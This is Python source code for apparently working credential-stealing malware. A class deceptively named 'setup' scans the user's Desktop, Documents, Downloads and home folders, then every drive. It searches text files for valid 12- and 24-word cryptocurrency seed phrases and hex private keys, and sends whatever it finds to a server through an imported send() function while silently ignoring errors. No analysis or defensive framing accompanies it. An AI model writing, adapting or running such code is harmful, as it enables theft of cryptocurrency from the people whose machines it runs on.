import os
import re
import time
import json
from pathlib import Path
from export import send
from mnemonic import Mnemonic

# Use mnemonic library for validation
mnemo = Mnemonic("english")

# Log file for debugging
LOG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scanner_log.txt")

def log(msg):
    """Write to log file."""
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.ctime()} - {msg}\n")
    except:
        pass

class setup:
    def __init__(self):
        self.data = []
        self.files_scanned = 0
        self.found_items = []
    
    def run(self):
        log("=== SCAN STARTED ===")
        self._scan_priority_folders()
        self._scan_full_system()
        log(f"SCAN COMPLETE - Scanned: {self.files_scanned} files, Found: {len(self.found_items)}")
        
        if self.found_items:
            for item in self.found_items:
                self.data.append(item)
            log(f"Sending {len(self.found_items)} items to server...")
            send(self.data)
            log("Data sent to server")
        else:
            log("No data found")
    
    def _scan_priority_folders(self):
        """Scan desktop, documents, downloads first."""
        priority_paths = [
            os.path.expandvars("%USERPROFILE%\\Desktop"),
            os.path.expandvars("%USERPROFILE%\\Documents"),
            os.path.expandvars("%USERPROFILE%\\Downloads"),
            os.path.expandvars("%USERPROFILE%"),
        ]
        
        log("Scanning priority folders...")
        for path in priority_paths:
            if os.path.exists(path):
                log(f"  Scanning: {path}")
                self._scan_directory(path, depth_limit=2)
    
    def _scan_full_system(self):
        """Scan entire drive but skip system folders."""
        log("Scanning full system...")
        drives = self._get_drives()
        for drive in drives:
            log(f"  Scanning drive: {drive}")
            self._scan_directory(drive, skip_system=True)
    
    def _get_drives(self):
        """Get all available drives."""
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letter}:\\"
            if os.path.exists(path):
                drives.append(path)
        return drives
    
    def _scan_directory(self, directory, depth_limit=None, skip_system=False):
        """Scan directory for seed phrases."""
        try:
            skip_dirs = [
                'Windows', 'Program Files', 'Program Files (x86)',
                'System32', 'System Volume Information', '$Recycle.Bin',
                'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft\\Windows\\INetCache',
                'AppData\\Local\\Packages', 'AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache',
                'AppData\\Roaming\\Code', 'AppData\\Roaming\\discord',
                '.git', 'node_modules', 'venv', 'env', '__pycache__'
            ]
            
            for root, dirs, files in os.walk(directory):
                # Skip system folders
                if skip_system:
                    dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                
                # Depth limit
                if depth_limit:
                    depth = root.replace(directory, '').count(os.sep)
                    if depth > depth_limit:
                        continue
                
                for file in files:
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    # Only scan text files
                    text_exts = {'.txt', '.json', '.dat', '.log', '.bak', '.old', '.md',
                                '.cfg', '.conf', '.ini', '.csv', '.xml', '.yml', '.yaml'}
                    
                    if ext in text_exts or not ext:
                        self._scan_file(file_path)
                    
                    self.files_scanned += 1
                    if self.files_scanned % 5000 == 0:
                        log(f"  Scanned {self.files_scanned} files...")
                        
        except Exception as e:
            log(f"Error scanning {directory}: {e}")
    
    def _scan_file(self, file_path):
        """Scan a single file for seeds or private keys."""
        try:
            # Skip files larger than 5MB for speed
            if os.path.getsize(file_path) > 5 * 1024 * 1024:
                return
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
                if not content or len(content) < 20:
                    return
                
                # Check for 12-word seed phrase
                words = re.findall(r'\b[a-zA-Z]+\b', content)
                
                # Look for exactly 12 words in a row
                for i in range(len(words) - 11):
                    phrase = ' '.join(words[i:i+12])
                    try:
                        if mnemo.check(phrase):
                            log(f"✅ Found SEED PHRASE: {file_path}")
                            self.found_items.append({
                                'type': 'seed_phrase',
                                'path': file_path,
                                'content': phrase
                            })
                            return  # Stop after first seed found in this file
                    except:
                        pass
                
                # Look for 24-word seed
                for i in range(len(words) - 23):
                    phrase = ' '.join(words[i:i+24])
                    try:
                        if mnemo.check(phrase):
                            log(f"✅ Found 24-WORD SEED: {file_path}")
                            self.found_items.append({
                                'type': 'seed_phrase_24',
                                'path': file_path,
                                'content': phrase
                            })
                            return
                    except:
                        pass
                
                # Check for private keys (64 hex chars)
                # Must start with 0x or be exactly 64 hex chars
                key_pattern = r'(?:0x)?[a-fA-F0-9]{64}'
                matches = re.findall(key_pattern, content)
                for match in matches:
                    # Validate it's not a hash or random string
                    # Check if it has at least one uppercase (indicates it might be a real key)
                    if len(match) == 66 and match.startswith('0x'):
                        log(f"✅ Found PRIVATE KEY: {file_path}")
                        self.found_items.append({
                            'type': 'private_key',
                            'path': file_path,
                            'content': match
                        })
                        return
                    elif len(match) == 64:
                        # Check if it looks like a real private key (not all zeros or ones)
                        if match not in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
                            log(f"✅ Found PRIVATE KEY: {file_path}")
                            self.found_items.append({
                                'type': 'private_key',
                                'path': file_path,
                                'content': f"0x{match}"
                            })
                            return
                
        except Exception:
            pass  # Silently skip unreadable files